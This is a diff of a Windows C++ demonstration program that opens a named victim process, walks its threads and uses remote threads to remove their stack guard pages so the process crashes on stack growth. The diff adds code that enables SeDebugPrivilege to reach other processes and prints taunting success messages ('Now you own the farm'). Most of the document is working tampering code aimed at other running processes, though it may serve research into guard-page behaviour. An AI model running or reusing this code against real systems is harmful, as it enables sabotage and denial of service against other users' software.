@@ -1,5 +1,5 @@
 // Compile command:
-// cl.exe /Ox /EHsc demo4.cpp Shlwapi.lib
+// cl.exe /Ox /EHsc demo4.cpp Shlwapi.lib Advapi32.lib
 
 #define UNICODE
 
@@ -134,7 +134,7 @@ static void BreakStackGuardPage(HANDLE hProcess, DWORD_PTR stackLimit)
     WaitForSingleObject(hRemoteThread, 10000);
 }
 
-static void ListProcessThreads(HANDLE hProcess, DWORD owner_pid)
+void BrakeThreadGuardPagesInProcess(HANDLE hProcess, DWORD owner_pid)
 { 
     HANDLE thread_snapshot = INVALID_HANDLE_VALUE; 
     THREADENTRY32 thread_entry;
@@ -149,10 +149,13 @@ static void ListProcessThreads(HANDLE hProcess, DWORD owner_pid)
         return;
 
     do { 
-        if (thread_entry.th32OwnerProcessID == owner_pid) {
-            fwprintf(stdout, L"thread_id = %x \n", thread_entry.th32ThreadID);
+        if (thread_entry.th32OwnerProcessID == owner_pid)
+        {
+            printf("Blowing the guard page. (thread_id = %d).\n", thread_entry.th32ThreadID);
+
             DWORD_PTR stackLimitAddr = GetThreadStackLimitAddress(thread_entry.th32ThreadID);
-            if (stackLimitAddr != 0) {
+            if (stackLimitAddr != 0)
+            {
                 BreakStackGuardPage(hProcess, stackLimitAddr);
                 stackLimitAddr -= 0x1000;
                 BreakStackGuardPage(hProcess, stackLimitAddr);
@@ -167,8 +170,9 @@ static void ListProcessThreads(HANDLE hProcess, DWORD owner_pid)
     CloseHandle(thread_snapshot);
 }
 
-static void BrakeStackGuardPages(const char victimProcessName[])
+bool BrakeStackGuardPages(const char victimProcessName[])
 {
+    bool succeeded = false;
     DWORD aProcesses[4096], bytesReturned;
 
     if (EnumProcesses(aProcesses, sizeof(aProcesses), &bytesReturned) != 0) {
@@ -183,22 +187,27 @@ static void BrakeStackGuardPages(const char victimProcessName[])
             );
 
             if (hProcess == NULL) {
-                printf("Failed open process id = %x\n", processID);
+                // printf("Failed open process id = %x, LastError = %x\n", processID, GetLastError());
                 continue;
             }
-            else {
-                printf("Opened process id = %x\n", processID);
-            }
+
+            // printf("Opened process id = %x\n", processID);
 
             DWORD nSize = sizeof(szProcessName)/sizeof(szProcessName[0]);
             if (GetModuleFileNameExA(hProcess, NULL, szProcessName, nSize) == 0)
                 continue;
-
+                
             PathStripPathA(szProcessName);
             if (_stricmp(szProcessName, victimProcessName) == 0)
-                ListProcessThreads(hProcess, processID);
+            {
+                printf("Process name matched: %s\n", szProcessName);
+                BrakeThreadGuardPagesInProcess(hProcess, processID);
+                succeeded = true;
+            }
         }
     }
+
+    return succeeded;
 }
 
 _declspec(noinline) void Crash()
@@ -211,6 +220,35 @@ _declspec(noinline) void Crash()
     test[0] = 1;
 }
 
+// See https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113
+bool TryToObtainSeDebugPrivilege()
+{
+    HANDLE Token;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token) == FALSE)
+    {
+        return false;
+    }
+
+    LUID Luid;
+    if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid) == FALSE)
+    {
+        return false;
+    }
+
+    TOKEN_PRIVILEGES NewState;
+    NewState.PrivilegeCount = 1;
+    NewState.Privileges[0].Luid = Luid;
+    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (AdjustTokenPrivileges(Token, FALSE, &NewState, sizeof(NewState), NULL, NULL) == 0
+        || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+    {
+        return false;
+    }
+
+    return true;
+}
+
 int main(int argc, char* argv[])
 {
     // Check the number of parameters
@@ -221,5 +259,19 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    BrakeStackGuardPages(argv[1]);
+    if (TryToObtainSeDebugPrivilege())
+    {
+        printf("You're lucky. Now you own the farm.\n");
+    }
+
+    if (BrakeStackGuardPages(argv[1]))
+    {
+        printf("!!! Process %s's guard pages were blown off.\n %s, Please tread carefully !!!", argv[1], argv[1]);
+    }
+    else
+    {
+        printf("Failed to brake the guard page for %s", argv[1]);
+    }
+
+    return 0;
 }
